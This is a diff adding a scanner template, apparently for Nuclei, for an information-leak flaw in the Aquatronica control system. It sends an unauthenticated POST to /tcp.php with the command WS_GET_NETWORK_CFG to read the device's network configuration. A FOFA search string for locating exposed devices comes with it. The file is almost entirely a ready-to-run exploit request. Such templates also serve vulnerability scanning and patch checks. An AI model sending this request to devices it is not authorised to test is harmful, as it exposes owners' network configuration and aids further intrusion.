@@ -1,0 +1,25 @@
+id: poc-amxnac4yd94c6z9y
+info:
+  name: Aquatronica控制系统tcp存在信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/amxnac4yd94c6z9y'
+  tags: info-leak,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: amxnac4yd94c6z9y
+    fofa: title="Aquatronica"
+http:
+- raw:
+  - 'POST /tcp.php HTTP/1.1
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Host: {{Hostname}}
+
+    function_id=tcp_xml_request&command=WS_GET_NETWORK_CFG'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
